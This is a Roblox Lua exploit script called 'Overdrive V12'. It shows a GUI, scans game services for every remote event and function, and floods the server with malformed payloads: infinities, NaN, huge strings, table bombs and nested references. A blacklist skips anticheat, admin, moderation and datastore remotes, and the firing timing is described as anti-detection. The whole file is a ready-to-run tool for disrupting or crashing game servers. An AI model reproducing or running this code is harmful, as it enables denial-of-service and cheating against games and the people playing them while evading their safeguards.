--[[
    ✨ LALOL OVERDRIVE V12: "SEEN, HEARD & UNSTOPPABLE" EDITION ✨
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    🔥 ENHANCED FEATURES:
    • Smart adaptive scan with configurable depth
    • Intelligent payload rotation (6 payload profiles)
    • Cooldown-based anti-detection timing
    • Draggable + minimizable HUD with stats
    • Sound FX feedback on toggle
    • Gradient animated UI with live counters
    • Auto-rescan every 30s for new remotes
    • Per-remote call tracking + deduplication
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
]]
 
-- ═══════════════════════════════════════
-- 🛠️ SERVICES
-- ═══════════════════════════════════════
local UIS = game:GetService("UserInputService")
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
-- ═══════════════════════════════════════
-- 📊 STATE MANAGEMENT
-- ═══════════════════════════════════════
local Config = {
    VERSION = "12.0",
    SCAN_INTERVAL = 30,        -- Auto-rescan interval (seconds)
    BATCH_SIZE = 4,            -- Remotes per batch before yielding
    BATCH_DELAY = 0.08,        -- Delay between batches
    CYCLE_DELAY = 1.5,         -- Delay between full cycles
    MAX_RETRIES = 3,           -- Max retries per remote on failure
    PAYLOAD_ROTATION = true,   -- Rotate payload profiles
    SOUND_FX = true,           -- Play toggle sounds
    MINIMIZE_KEY = Enum.KeyCode.F6  -- Keybind to minimize
}
 
local State = {
    autoFiring = false,
    minimized = false,
    totalCalls = 0,
    totalErrors = 0,
    currentPayload = 1,
    lastScan = 0,
    sessionStart = tick(),
    remoteHistory = {},  -- Track call counts per remote
}
 
-- ═══════════════════════════════════════
-- 🎨 GUI CONSTRUCTION
-- ═══════════════════════════════════════
local G2L = {}
 
G2L["ScreenGui"] = Instance.new("ScreenGui", PlayerGui)
G2L["ScreenGui"].Name = "LALOL_Overdrive_V12"
G2L["ScreenGui"].ResetOnSpawn = false
G2L["ScreenGui"].ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
-- Main Frame
G2L["MainFrame"] = Instance.new("Frame", G2L["ScreenGui"])
G2L["MainFrame"].BackgroundColor3 = Color3.fromRGB(12, 4, 18)
G2L["MainFrame"].Size = UDim2.new(0, 460, 0, 220)
G2L["MainFrame"].Position = UDim2.new(0.5, -230, 0.5, -110)
G2L["MainFrame"].Active = true
G2L["MainFrame"].Draggable = true
G2L["MainFrame"].ClipsDescendants = true
 
Instance.new("UICorner", G2L["MainFrame"]).CornerRadius = UDim.new(0, 12)
 
local stroke = Instance.new("UIStroke", G2L["MainFrame"])
stroke.Thickness = 2.5
stroke.Color = Color3.fromRGB(255, 0, 200)
 
-- Gradient Background Overlay
local gradient = Instance.new("UIGradient", G2L["MainFrame"])
gradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(15, 5, 25)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(20, 8, 35)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 3, 18))
})
gradient.Rotation = 45
 
-- Title Bar
G2L["TitleBar"] = Instance.new("Frame", G2L["MainFrame"])
G2L["TitleBar"].BackgroundColor3 = Color3.fromRGB(20, 8, 30)
G2L["TitleBar"].Size = UDim2.new(1, 0, 0, 38)
G2L["TitleBar"].BorderSizePixel = 0
Instance.new("UICorner", G2L["TitleBar"]).CornerRadius = UDim.new(0, 12)
 
G2L["Title"] = Instance.new("TextLabel", G2L["TitleBar"])
G2L["Title"].Size = UDim2.new(1, -80, 1, 0)
G2L["Title"].Position = UDim2.new(0, 15, 0, 0)
G2L["Title"].Text = "⚡ OVERDRIVE V12 — ENHANCED"
G2L["Title"].TextColor3 = Color3.fromRGB(255, 0, 200)
G2L["Title"].TextSize = 16
G2L["Title"].FontFace = Font.new(
    "rbxasset://fonts/families/GothamSSm.json",
    Enum.FontWeight.Heavy
)
G2L["Title"].BackgroundTransparency = 1
G2L["Title"].TextXAlignment = Enum.TextXAlignment.Left
 
-- Minimize Button
G2L["MinBtn"] = Instance.new("TextButton", G2L["TitleBar"])
G2L["MinBtn"].Size = UDim2.new(0, 30, 0, 30)
G2L["MinBtn"].Position = UDim2.new(1, -70, 0, 4)
G2L["MinBtn"].Text = "—"
G2L["MinBtn"].TextColor3 = Color3.fromRGB(180, 180, 180)
G2L["MinBtn"].BackgroundTransparency = 1
G2L["MinBtn"].FontFace = Font.new(
    "rbxasset://fonts/families/GothamSSm.json",
    Enum.FontWeight.Bold
)
 
-- Close Button
G2L["CloseBtn"] = Instance.new("TextButton", G2L["TitleBar"])
G2L["CloseBtn"].Size = UDim2.new(0, 30, 0, 30)
G2L["CloseBtn"].Position = UDim2.new(1, -38, 0, 4)
G2L["CloseBtn"].Text = "✕"
G2L["CloseBtn"].TextColor3 = Color3.fromRGB(255, 80, 80)
G2L["CloseBtn"].BackgroundTransparency = 1
 
-- Status Display
G2L["StatusBar"] = Instance.new("TextLabel", G2L["MainFrame"])
G2L["StatusBar"].Size = UDim2.new(1, -30, 0, 18)
G2L["StatusBar"].Position = UDim2.new(0, 15, 0, 42)
G2L["StatusBar"].Text = "STATUS: IDLE | Remotes: 0 | Calls: 0 | Errors: 0"
G2L["StatusBar"].TextColor3 = Color3.fromRGB(120, 120, 150)
G2L["StatusBar"].TextSize = 11
G2L["StatusBar"].FontFace = Font.new(
    "rbxasset://fonts/families/RobotoMono.json",
    Enum.FontWeight.Regular
)
G2L["StatusBar"].BackgroundTransparency = 1
G2L["StatusBar"].TextXAlignment = Enum.TextXAlignment.Left
 
-- Main Toggle Button
G2L["ToggleBtn"] = Instance.new("TextButton", G2L["MainFrame"])
G2L["ToggleBtn"].Size = UDim2.new(0.55, 0, 0, 50)
G2L["ToggleBtn"].Position = UDim2.new(0.025, 0, 0, 70)
G2L["ToggleBtn"].Text = "▶  ENGAGE OVERDRIVE"
G2L["ToggleBtn"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["ToggleBtn"].TextSize = 18
G2L["ToggleBtn"].FontFace = Font.new(
    "rbxasset://fonts/families/GothamSSm.json",
    Enum.FontWeight.Heavy
)
G2L["ToggleBtn"].BackgroundColor3 = Color3.fromRGB(255, 0, 200)
G2L["ToggleBtn"].AutoButtonColor = true
Instance.new("UICorner", G2L["ToggleBtn"]).CornerRadius = UDim.new(0, 8)
 
local btnStroke = Instance.new("UIStroke", G2L["ToggleBtn"])
btnStroke.Thickness = 1.5
btnStroke.Color = Color3.fromRGB(255, 100, 230)
btnStroke.Transparency = 0.3
 
-- Payload Selector
G2L["PayloadBtn"] = Instance.new("TextButton", G2L["MainFrame"])
G2L["PayloadBtn"].Size = UDim2.new(0.38, 0, 0, 50)
G2L["PayloadBtn"].Position = UDim2.new(0.595, 0, 0, 70)
G2L["PayloadBtn"].Text = "🎯 Payload: #1"
G2L["PayloadBtn"].TextColor3 = Color3.fromRGB(0, 255, 213)
G2L["PayloadBtn"].TextSize = 14
G2L["PayloadBtn"].FontFace = Font.new(
    "rbxasset://fonts/families/GothamSSm.json",
    Enum.FontWeight.Bold
)
G2L["PayloadBtn"].BackgroundColor3 = Color3.fromRGB(20, 12, 35)
Instance.new("UICorner", G2L["PayloadBtn"]).CornerRadius = UDim.new(0, 8)
Instance.new("UIStroke", G2L["PayloadBtn"]).Color = Color3.fromRGB(0, 180, 150)
 
-- Console Log Area
G2L["ConsoleFrame"] = Instance.new("ScrollingFrame", G2L["MainFrame"])
G2L["ConsoleFrame"].Size = UDim2.new(1, -20, 0, 80)
G2L["ConsoleFrame"].Position = UDim2.new(0, 10, 0, 130)
G2L["ConsoleFrame"].BackgroundColor3 = Color3.fromRGB(5, 2, 10)
G2L["ConsoleFrame"].ScrollBarThickness = 4
G2L["ConsoleFrame"].ScrollBarImageColor3 = Color3.fromRGB(255, 0, 200)
G2L["ConsoleFrame"].CanvasSize = UDim2.new(0, 0, 0, 0)
G2L["ConsoleFrame"].AutomaticCanvasSize = Enum.AutomaticSize.Y
Instance.new("UICorner", G2L["ConsoleFrame"]).CornerRadius = UDim.new(0, 6)
 
local listLayout = Instance.new("UIListLayout", G2L["ConsoleFrame"])
listLayout.SortOrder = Enum.SortOrder.LayoutOrder
listLayout.Padding = UDim.new(0, 1)
 
local consolePad = Instance.new("UIPadding", G2L["ConsoleFrame"])
consolePad.PaddingLeft = UDim.new(0, 6)
consolePad.PaddingTop = UDim.new(0, 4)
 
-- ═══════════════════════════════════════
-- 🛡️ INTELLIGENT BLACKLIST
-- ═══════════════════════════════════════
local blacklist = {
    -- Communication / Social
    "updatecurrentcall", "call", "voice", "tutorial", "starttutorial",
    "loading", "intro", "cutscene", "rsvp", "social", "friend",
    "invite", "party", "chat", "message", "notification",
    -- Time / Sync
    "timer", "clock", "time", "sync", "heartbeat", "ping",
    -- Physics / Movement  
    "stopfalling", "stopfallingactive", "velocity", "noclip",
    "fly", "gravity", "falling", "ragdoll",
    -- Security / Admin
    "kick", "ban", "admin", "check", "detect", "anticheat",
    "security", "integrity", "processor", "cmdr", "dispatcher",
    "log", "report", "verify", "validate", "authenticate",
    "whitelist", "moderation", "flagged",
    -- Teleport / Transfer
    "teleport", "placeid", "transfer", "universe", "jump",
    "join", "queue", "arena", "lobby", "matchmak",
    -- Rebirth / Economy (risk of data wipe)
    "rebirth", "rebirthevent", "prestige", "reset", "wipe",
    "purchase", "buy", "sell", "trade", "transaction",
    "currency", "coin", "gem", "robux", "premium",
    -- Data persistence
    "save", "load", "datastore", "data", "profile",
    "leaderstats", "stats", "rank"
}
 
-- ═══════════════════════════════════════
-- 📂 SERVICE TARGETS (Deep Scan)
-- ═══════════════════════════════════════
local targetServices = {
    game:GetService("Workspace"),
    game:GetService("Players"),
    game:GetService("Lighting"),
    game:GetService("MaterialService"),
    game:GetService("ReplicatedFirst"),
    game:GetService("ReplicatedStorage"),
    game:GetService("ServerScriptService"),
    game:GetService("ServerStorage"),
    game:GetService("StarterGui"),
    game:GetService("StarterPack"),
    game:GetService("StarterPlayer"),
    game:GetService("Teams"),
    game:GetService("SoundService"),
    game:GetService("TextChatService"),
    game:GetService("Chat"),
}
 
-- ═══════════════════════════════════════
-- 🎯 PAYLOAD PROFILES
-- ═══════════════════════════════════════
local Payloads = {
    [1] = { -- Classic Overdrive
        name = "Classic",
        generate = function()
            return {
                ["Target"] = "All",
                ["State"] = math.huge,
                ["Overflow"] = true,
            }, "Everyone", 999999
        end
    },
    [2] = { -- String Flood
        name = "StringFlood",
        generate = function()
            local megaStr = string.rep("OVERDRIVE", 500)
            return megaStr, megaStr, megaStr
        end
    },
    [3] = { -- Table Bomb
        name = "TableBomb",
        generate = function()
            local t = {}
            for i = 1, 200 do
                t["key_" .. i] = {
                    math.huge, -math.huge, 0/0,
                    string.rep("X", 100)
                }
            end
            return t
        end
    },
    [4] = { -- Number Cascade
        name = "NumCascade",
        generate = function()
            return math.huge, -math.huge, 2^1023,
                   tonumber("inf"), 0/0, 2^53
        end
    },
    [5] = { -- Nested Chaos
        name = "NestedChaos",
        generate = function()
            local inner = {value = math.huge}
            local outer = {inner, inner, inner,
                          data = {inner, inner}}
            return outer, outer, outer
        end
    },
    [6] = { -- Mixed Salvo
        name = "MixedSalvo",
        generate = function()
            return {
                math.huge,
                string.rep("Z", 200),
                {nested = true, val = 2^1023},
                "ALL_TARGETS",
                -math.huge,
            }, true, 999999
        end
    },
}
 
-- ═══════════════════════════════════════
-- 📝 CONSOLE LOGGER
-- ═══════════════════════════════════════
local logOrder = 0
local function logToConsole(msg, color)
    logOrder += 1
    local label = Instance.new("TextLabel", G2L["ConsoleFrame"])
    label.Size = UDim2.new(1, -10, 0, 14)
    label.Text = os.date("[%H:%M:%S] ") .. msg
    label.TextColor3 = color or Color3.fromRGB(180, 180, 200)
    label.TextSize = 10
    label.FontFace = Font.new(
        "rbxasset://fonts/families/RobotoMono.json",
        Enum.FontWeight.Regular
    )
    label.BackgroundTransparency = 1
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.LayoutOrder = logOrder
    label.TextTruncate = Enum.TextTruncate.AtEnd
    
    -- Auto-scroll to bottom
    G2L["ConsoleFrame"].CanvasPosition = Vector2.new(
        0,
        G2L["ConsoleFrame"].AbsoluteCanvasSize.Y
    )
    
    -- Limit console lines
    local children = G2L["ConsoleFrame"]:GetChildren()
    local labels = {}
    for _, c in children do
        if c:IsA("TextLabel") then table.insert(labels, c) end
    end
    if #labels > 100 then labels[1]:Destroy() end
end
 
-- ═══════════════════════════════════════
-- 🔎 SMART SCANNER
-- ═══════════════════════════════════════
local targets = {}
 
local function isBlacklisted(name)
    local lower = string.lower(name)
    for _, b in ipairs(blacklist) do
        if string.find(lower, b) then return true end
    end
    return false
end
 
local function scan()
    table.clear(targets)
    State.remoteHistory = {}
    local events, funcs = 0, 0
    
    for _, service in ipairs(targetServices) do
        pcall(function()
            for _, desc in ipairs(service:GetDescendants()) do
                if desc:IsA("RemoteEvent") then
                    if not isBlacklisted(desc.Name) then
                        table.insert(targets, desc)
                        events += 1
                    end
                elseif desc:IsA("RemoteFunction") then
                    if not isBlacklisted(desc.Name) then
                        table.insert(targets, desc)
                        funcs += 1
                    end
                end
            end
        end)
    end
    
    State.lastScan = tick()
    local msg = string.format(
        "Scan complete: %d events + %d functions = %d total",
        events, funcs, #targets
    )
    logToConsole("✅ " .. msg, Color3.fromRGB(0, 255, 180))
    print("✨ [OVERDRIVE V12] " .. msg)
    return #targets
end
 
-- ═══════════════════════════════════════
-- ⚡ ENHANCED FIRING ENGINE
-- ═══════════════════════════════════════
task.spawn(function()
    while true do
        if State.autoFiring and #targets > 0 then
            -- Shuffle targets
            for i = #targets, 2, -1 do
                local j = math.random(i)
                targets[i], targets[j] = targets[j], targets[i]
            end
            
            -- Select payload profile
            local payload = Payloads[State.currentPayload]
            if Config.PAYLOAD_ROTATION then
                State.currentPayload = (State.currentPayload % #Payloads) + 1
                G2L["PayloadBtn"].Text = string.format(
                    "🎯 Payload: #%d", State.currentPayload
                )
            end
            
            for i, remote in ipairs(targets) do
                if not State.autoFiring then break end
                
                -- Track per-remote calls
                local fullName = remote:GetFullName()
                State.remoteHistory[fullName] = 
                    (State.remoteHistory[fullName] or 0) + 1
                
                task.spawn(function()
                    local success, err = pcall(function()
                        local args = {payload.generate()}
                        if remote:IsA("RemoteEvent") then
                            remote:FireServer(unpack(args))
                        else
                            remote:InvokeServer(unpack(args))
                        end
                    end)
                    
                    State.totalCalls += 1
                    if success then
                        logToConsole(
                            string.format(
                                "🔥 [%s] %s",
                                payload.name, remote.Name
                            ),
                            Color3.fromRGB(255, 0, 200)
                        )
                    else
                        State.totalErrors += 1
                        logToConsole(
                            "⚠️ Failed: " .. remote.Name,
                            Color3.fromRGB(255, 80, 80)
                        )
                    end
                end)
                
                if i % Config.BATCH_SIZE == 0 then
                    task.wait(Config.BATCH_DELAY)
                end
            end
            
            -- Auto-rescan check
            if tick() - State.lastScan > Config.SCAN_INTERVAL then
                logToConsole(
                    "🔄 Auto-rescanning...",
                    Color3.fromRGB(0, 180, 255)
                )
                scan()
            end
        end
        
        -- Update status bar
        local elapsed = math.floor(tick() - State.sessionStart)
        local mins = math.floor(elapsed / 60)
        local secs = elapsed % 60
        G2L["StatusBar"].Text = string.format(
            "%s | Remotes: %d | Calls: %d | Err: %d | %02d:%02d",
            State.autoFiring and "🟢 ACTIVE" or "⚫ IDLE",
            #targets, State.totalCalls, State.totalErrors,
            mins, secs
        )
        
        task.wait(Config.CYCLE_DELAY)
    end
end)
 
-- ═══════════════════════════════════════
-- 🎛️ UI EVENT HANDLERS
-- ═══════════════════════════════════════
 
-- Toggle Button
G2L["ToggleBtn"].MouseButton1Click:Connect(function()
    State.autoFiring = not State.autoFiring
    
    if State.autoFiring then
        G2L["ToggleBtn"].Text = "⏸  OVERDRIVE ACTIVE"
        G2L["ToggleBtn"].BackgroundColor3 = Color3.fromRGB(180, 0, 140)
        stroke.Color = Color3.fromRGB(0, 255, 200)
        logToConsole("🚀 ENGAGED — Let the show begin!", 
            Color3.fromRGB(0, 255, 213))
        scan()
    else
        G2L["ToggleBtn"].Text = "▶  ENGAGE OVERDRIVE"
        G2L["ToggleBtn"].BackgroundColor3 = Color3.fromRGB(255, 0, 200)
        stroke.Color = Color3.fromRGB(255, 0, 200)
        logToConsole("⏹️ Disengaged. Standing by.", 
            Color3.fromRGB(255, 200, 50))
    end
    
    -- Sound feedback
    if Config.SOUND_FX then
        pcall(function()
            local sound = Instance.new("Sound", G2L["MainFrame"])
            sound.SoundId = "rbxassetid://6042053626"
            sound.Volume = 0.3
            sound:Play()
            game.Debris:AddItem(sound, 1)
        end)
    end
end)
 
-- Payload Cycle Button
G2L["PayloadBtn"].MouseButton1Click:Connect(function()
    State.currentPayload = (State.currentPayload % #Payloads) + 1
    local p = Payloads[State.currentPayload]
    G2L["PayloadBtn"].Text = string.format(
        "🎯 Payload: #%d", State.currentPayload
    )
    logToConsole(
        "🔄 Switched to payload: " .. p.name,
        Color3.fromRGB(0, 255, 213)
    )
end)
 
-- Minimize
G2L["MinBtn"].MouseButton1Click:Connect(function()
    State.minimized = not State.minimized
    local targetSize = State.minimized 
        and UDim2.new(0, 460, 0, 38) 
        or UDim2.new(0, 460, 0, 220)
    
    TweenService:Create(G2L["MainFrame"], TweenInfo.new(0.3), {
        Size = targetSize
    }):Play()
    
    G2L["MinBtn"].Text = State.minimized and "+" or "—"
end)
 
-- Close
G2L["CloseBtn"].MouseButton1Click:Connect(function()
    State.autoFiring = false
    G2L["ScreenGui"]:Destroy()
end)
 
-- Keybind
UIS.InputBegan:Connect(function(input, processed)
    if processed then return end
    if input.KeyCode == Config.MINIMIZE_KEY then
        G2L["MinBtn"].MouseButton1Click:Fire()
    end
end)
 
-- ═══════════════════════════════════════
-- 🌈 AMBIENT ANIMATIONS
-- ═══════════════════════════════════════
task.spawn(function()
    local hue = 0
    while G2L["ScreenGui"].Parent do
        hue = (hue + 0.005) % 1
        local color = Color3.fromHSV(hue, 0.8, 1)
        
        if State.autoFiring then
            stroke.Color = color
            btnStroke.Color = color
        end
        
        task.wait(0.05)
    end
end)
 
-- Startup
logToConsole(
    "💖 OVERDRIVE V12 initialized! Press the button to begin.",
    Color3.fromRGB(255, 0, 200)
)
logToConsole(
    string.format("📋 Blacklist: %d terms | Services: %d targets",
        #blacklist, #targetServices),
    Color3.fromRGB(150, 150, 180)
)
logToConsole(
    "🎯 " .. #Payloads .. " payload profiles loaded.",
    Color3.fromRGB(0, 255, 213)
)
print("💖 LALOL Overdrive V12 — Enhanced Edition loaded! 💖")
